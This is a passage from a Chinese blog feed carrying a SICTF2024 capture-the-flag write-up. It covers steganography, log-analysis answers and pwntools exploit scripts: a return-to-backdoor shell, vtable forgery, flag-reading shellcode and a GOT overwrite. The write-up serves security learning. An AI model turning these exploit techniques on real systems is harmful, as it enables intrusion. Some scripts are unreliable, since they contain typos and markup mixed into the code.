class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 从文件中读取十六进制字符串</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节序列</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节序列写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># 输出文件为二进制文件，因为十六进制是字节数据</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分出字节码&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SICTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-03-02T08:33:55.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICTF2024"><a href="#SICTF2024" class="headerlink" title="SICTF2024"></a>SICTF2024</h1><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="真💨签到"><a href="#真💨签到" class="headerlink" title="真💨签到"></a>真💨签到</h3><ul><li>加密zip文件包最后一串数字，5456545454565458414259555854585458434152595958415a435959595558563d<ul><li>16进制转字符TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV&#x3D;</li><li><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">字符文本解密</a> 2024HappyNewYear</li></ul></li><li>zip解压后一个音频一个图片<ul><li>音频用Audacity <strong>注意音频名称</strong></li><li>用steghide解码  steghide extract -sf steg.jpg</li></ul></li></ul><h3 id="New-Year’s-regret"><a href="#New-Year’s-regret" class="headerlink" title="New Year’s regret"></a>New Year’s regret</h3><ul><li><p>密码是2024SICTF</p></li><li><p>01画图（赛博厨子），汉信码，以及压缩包末尾发现字符串，尝试hex编码（考虑逆向输入）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;43637d135333&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#333531d73634--&gt;351×64</span></span><br></pre></td></tr></table></figure><p>画图：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX1=<span class="number">351</span></span><br><span class="line">MAX2=<span class="number">64</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX1,MAX2))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01码&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX2):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX1):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121035339.png" alt="image-20240226121035339"></p><ul><li>music-sheet-cipher解码得一部分：</li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121133988.png" alt="image-20240226121133988"></p><ul><li><p>010另一文件有压缩包和png图片，kali分离<br>压缩包解压base64循环</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bases64 <span class="keyword">import</span> b64ecode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=re.sub(<span class="string">r&#x27;flag|[⼀-龥]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,data)</span><br><span class="line">        decode_data=b64ecode(data)</span><br><span class="line">        <span class="keyword">return</span> decode_data.decode(),<span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> data.<span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_new.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;ute-8&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">    date = file.read()</span><br><span class="line">iterations = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data,can_decode=process_data(data)</span><br><span class="line">    iterations+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result&quot;</span>,data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rotatin&quot;</span>,iterations)</span><br><span class="line">        braek</span><br></pre></td></tr></table></figure></li><li><p>战双帕米什武器星级，，，</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>考虑摩斯密码，4为”.”,6”-“,5为空格</p><p>三部分拼起来</p></li></ul></li></ul><h3 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h3><h3 id="神秘的流量"><a href="#神秘的流量" class="headerlink" title="神秘的流量"></a>神秘的流量</h3><p><em>题⽬描述：</em></p><p><em>flag值：SICTF{b50936c7-b60d-411e-a91f-304937164b9c}</em></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p><p>使⽤ cs-extract-key.py ⼯具 可以得到 AES key : HMAC key</p><p>然后⽤ cs-parse-http-traffic.py 就可以拿到明⽂</p><p>参考资料：</p><p><a href="https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/">https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/</a></p><h3 id="WHO？WHO？WHO？"><a href="#WHO？WHO？WHO？" class="headerlink" title="WHO？WHO？WHO？"></a>WHO？WHO？WHO？</h3><p>1、archpr爆破密码为qweqwe</p><p>2、使⽤零宽后得到⼀串rabbit解密，且密码就是问题的答案，密码为shumu</p><p>3、根据⽂件题⽬提⽰使⽤DNA解密得到flag</p><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析 1"></a>日志分析 1</h3><p>SICTF{黑客所接入的IP地址|黑客所创建的用户名|黑客所加入的用户组|黑客创建的计划名|创建计划任务的对象后门所处的路径（小写盘符……,后门路径精确到****.exe）|黑客远程登陆RDP的账户}<br> 后门路径精确到****.exe</p><p>直接使用windows工具筛查</p><p>{192.168.222.200|attack$|Administrators|callback|c:\windows\system32\windows_at*</p><p><em>tack.exe|ADOFLMB\attack$}</em></p><h3 id="日志分析2"><a href="#日志分析2" class="headerlink" title="日志分析2"></a>日志分析2</h3><p><em>SICTF{攻击者的IP地址|攻击者得到Web应⽤后台管理权限的⽅法|攻击者在SQL注⼊攻击过程中使⽤</em></p><p><em>的⾃动化⼯具名称|⼯具版本号|攻击者使⽤的Webshell连接⼯具（中⽂名）|⼯具版本号}</em></p><p><em>flag值：SICTF{10.11.35.95|暴⼒破解|sqlmap|1.2.4.18|蚁剑|2.1}</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Signin-pwn"><a href="#Signin-pwn" class="headerlink" title="Signin-pwn"></a>Signin-pwn</h3><p>read之后调⽤了strlen，就会把rdi设置为bug的地址，所以只需要buf以&#x2F;bin&#x2F;sh开头，然后直接改返回地址到backdoor的system那⾥即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x4011f4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;command:&#x27;</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\0x00&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>,</span><br><span class="line">    backdoor</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy Cpp"></a>Eeeeasy Cpp</h3><p>思路是泄露堆地址然后伪造vtable，把虚表指针指向伪造的vtable再call⼀下完成利⽤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> def <span class="built_in">get</span>(name, passwd):</span><br><span class="line"><span class="number">6</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">7 p.sendline(b&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">8</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">9 p.sendline(name)</span></span><br><span class="line"><span class="string">10 p.recvuntil(b&#x27;</span>password: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">11 p.sendline(passwd)</span></span><br><span class="line"><span class="string">12</span></span><br><span class="line"><span class="string">13 def show():</span></span><br><span class="line"><span class="string">14 p.recvuntil(b&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">15 p.sendline(b&#x27;</span>P<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">1617</span> <span class="meta">#p = process(<span class="string">&#x27;./EeeeasyCpp&#x27;</span>)</span></span><br><span class="line"><span class="number">18</span> p = <span class="built_in">remote</span>(<span class="string">&#x27;xxxxxx&#x27;</span>, xxxx)</span><br><span class="line"><span class="number">19</span> <span class="meta"># set offset to 0x40 to check <span class="keyword">if</span> the offset is correct by comparing with vtable</span></span><br><span class="line"><span class="number">20</span> offset = <span class="number">0x48</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">22</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>gift: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">23 main = int(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="number">24</span> base = main - <span class="number">0x2650</span></span><br><span class="line"><span class="number">25</span> <span class="built_in">success</span>(<span class="string">&#x27;base addr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(base)))</span><br><span class="line"><span class="number">26</span> backdoor = base + <span class="number">0x22e0</span></span><br><span class="line"><span class="number">27</span> vtable = base + <span class="number">0x4d48</span></span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">29</span> <span class="built_in">info</span>(<span class="string">&#x27;vtable -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(vtable)))</span><br><span class="line"><span class="number">30</span> <span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="number">31</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">32</span> b<span class="number">&#x27;123&#x27;</span>,</span><br><span class="line"><span class="number">33</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">34</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">35</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">36</span> vtable, <span class="built_in">bytes</span>([offset])</span><br><span class="line"><span class="number">37</span> ])</span><br><span class="line"><span class="number">38</span> )</span><br><span class="line"><span class="number">39</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">40</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>Name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">41 ptr = u64(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="number">42</span> <span class="meta"># heap</span></span><br><span class="line"><span class="number">43</span> <span class="built_in">success</span>(<span class="string">&#x27;ptr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(ptr)))</span><br><span class="line"><span class="number">44</span> <span class="keyword">if</span> ptr == <span class="number">0</span>:</span><br><span class="line"><span class="number">45</span> raise <span class="built_in">Exception</span>(<span class="string">&#x27;name addr is 0&#x27;</span>)</span><br><span class="line"><span class="number">46</span> <span class="meta"># rollback</span></span><br><span class="line"><span class="number">47</span> name_addr = ptr - <span class="number">0x38</span></span><br><span class="line"><span class="number">48</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">49</span> <span class="built_in">flat</span>([name_addr]),</span><br><span class="line"><span class="number">50</span> <span class="built_in">flat</span>([<span class="number">0x21</span>])</span><br><span class="line"><span class="number">51</span> )</span><br><span class="line"><span class="number">52</span> <span class="meta"># <span class="keyword">if</span> name is 123, rollback success</span></span><br><span class="line"><span class="number">53</span> <span class="meta"># show()</span></span><br><span class="line"><span class="number">54</span> fake_vtable = name_addr</span><br><span class="line"><span class="number">55</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">56</span> <span class="built_in">flat</span>([backdoor, backdoor]), <span class="meta"># check by setting backdoor to main</span></span><br><span class="line"><span class="number">57</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">58</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">59</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">60</span> fake_vtable, name_addr</span><br><span class="line"><span class="number">61</span> ])</span><br><span class="line"><span class="number">62</span> )</span><br><span class="line"><span class="number">63</span> <span class="meta"># get or show will trigger the backdoor</span></span><br><span class="line"><span class="number">64</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">65</span> p.<span class="built_in">interactive</span>()</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">67</span> except Exception as e:</span><br><span class="line"><span class="number">68</span> <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, e)</span><br><span class="line"><span class="number">69</span> p.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug Zapper"></a>Bug Zapper</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">您是否经常被bug烦恼？您是否想要⼀款安全，⾼效，没有任何额外副产出的杀⾍器？*</span><br><span class="line"></span><br><span class="line">*请选择我们！我们是值得您信赖的杀⾍专家！⽆论什么bug，我们都能⽴即甄别并处理！我们Bug*</span><br><span class="line"></span><br><span class="line">*Zapper郑重承诺，绝不放过任何⼀个shellcode！*</span><br><span class="line"></span><br><span class="line">*Bug Zapper灭⾍剂，⼀扫就灭，让bug⽆处可逃！*</span><br><span class="line"></span><br><span class="line">*Bug Zapper灭⾍剂，让你写的开⼼，⽤的放⼼。</span><br></pre></td></tr></table></figure><p>输⼊⻓度不⼤于0x10，使得syscall的时候调⽤号在0x55（creat）到0x65（ptrace）</p><p>然后需要在前三个参数都是0的情况下，syscall后返回值为0，有3个调⽤可以符合</p><p>分别是fchmod（0x5b）， gettimeofday（0x60），ptrace（0x65）</p><p>也就是分别对应了输⼊⻓度为6，11，16字节。（注意ptrace在动调时是返回-1的）</p><p>我们直接使⽤ptrace打（这题其实11字节就够了，也就是gettimeofday就能过，调试也相对⽅便），⻓度不够就把第⼆段payload给read到0x1919820后⾯，然后就是⼀波orw，不过要注意，这⾥调⽤execve会失败，直接⽤pwntools的shellcraft应该是不⾏的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> p = process(<span class="string">&#x27;./bugzapper&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8 add rax, 0x10 ; rax = 0x1919820</span></span><br><span class="line"><span class="string">9 mov rsi, rax</span></span><br><span class="line"><span class="string">10 mov edx, 0x80</span></span><br><span class="line"><span class="string">11 xor eax, eax</span></span><br><span class="line"><span class="string">12 syscall</span></span><br><span class="line"><span class="string">13 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">14</span> payload = <span class="string">b&#x27;H\x83\xc0\x10H\x89\xc6\xba\x80\x00\x00\x001\xc0\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">15</span> <span class="comment"># assert len(payload) == 0x10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">17</span> p.recv()</span><br><span class="line"><span class="number">18</span> p.send(payload)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">21 mov eax, 0x67616c66</span></span><br><span class="line"><span class="string">22 mov [esi - 0x10], rax</span></span><br><span class="line"><span class="string">23</span></span><br><span class="line"><span class="string">24 // 这⾥是确认 &quot;flag&quot; 已经写⼊了 0x1919810</span></span><br><span class="line"><span class="string">25 // write(1, 0x1919810, 0x20)</span></span><br><span class="line"><span class="string">26 mov edi, 1</span></span><br><span class="line"><span class="string">27 sub esi, 0x10 ; rsi = 0x1919810</span></span><br><span class="line"><span class="string">28 mov edx, 0x20</span></span><br><span class="line"><span class="string">29 mov eax, 0x1</span></span><br><span class="line"><span class="string">30 syscall</span></span><br><span class="line"><span class="string">31</span></span><br><span class="line"><span class="string">32 // open(&quot;flag&quot;, 0, 0)</span></span><br><span class="line"><span class="string">33 mov edi, esi</span></span><br><span class="line"><span class="string">34 xor esi, esi</span></span><br><span class="line"><span class="string">35 xor edx, edx</span></span><br><span class="line"><span class="string">36 mov eax, 2</span></span><br><span class="line"><span class="string">37 syscall</span></span><br><span class="line"><span class="string">38</span></span><br><span class="line"><span class="string">39 // read(3, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">40 mov esi, 0x1919870</span></span><br><span class="line"><span class="string">41 mov edi, 3</span></span><br><span class="line"><span class="string">42 mov edx, 0x40</span></span><br><span class="line"><span class="string">43 mov eax, 0</span></span><br><span class="line"><span class="string">44 syscall</span></span><br><span class="line"><span class="string">45</span></span><br><span class="line"><span class="string">46 // write(1, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">47 mov edi, 1</span></span><br><span class="line"><span class="string">48 mov eax, 1</span></span><br><span class="line"><span class="string">49 syscall</span></span><br><span class="line"><span class="string">50</span></span><br><span class="line"><span class="string">51 // exit(0)</span></span><br><span class="line"><span class="string">52 mov edi, 0</span></span><br><span class="line"><span class="string">53 mov eax, 0x3c</span></span><br><span class="line"><span class="string">54 syscall</span></span><br><span class="line"><span class="string">55 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">56</span> payload = <span class="string">b&#x27;\xb8flaggH\x89F\xf0\xbf\x01\x00\x00\x00\x83\xee\x10\xba\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x89\xf71\xf61\xd2\xb8\x02\x00\x00\x00\x0f\x05\xbep\x98\x91\x01\xbf\x03\x00\x00\x00\xba@\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8&lt;\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">57</span> p.send(payload)</span><br><span class="line"><span class="number">58</span></span><br><span class="line"><span class="number">59</span> p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug Zapper Pro+"></a>Bug Zapper Pro+</h3><p><em>出题⼈：椰奶</em></p><p><em>题⽬描述：感谢您⼀直以来的⽀持，所以为了回馈⽼⽤⼾，我们推出了这款全新的Bug zapper pro</em></p><p><em>+，有任何问题欢迎向我们反馈</em></p><p>通过异或等构造⼀个syscall出来，然后为了⽅便直接把rdx设置为114514xxx那玩意，所以跑脚本建议</p><p>后⾯的payload在send前最好pause⼀下，⼀起发的话有可能会由于read⻓度太⼤导致后⾯的payload</p><p>在⼀开始也被读进去（</p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>栈溢出修改string的引⽤为stack_chk的got地址，从⽽修改got表为后⻔地址，同时覆盖canary触发后</p><p>⻔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line"></span><br><span class="line">2 context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">4 *#p = process(&#x27;./overflow&#x27;)*</span><br><span class="line"></span><br><span class="line">5 p = remote(&quot;xxxxxxxx&quot;, xxxxx)</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line"></span><br><span class="line">7 backdoor = 0x4011d0</span><br><span class="line"></span><br><span class="line">8 chk_got = 0x404018</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">10 *#gdb.attach(p)*</span><br><span class="line"></span><br><span class="line">11 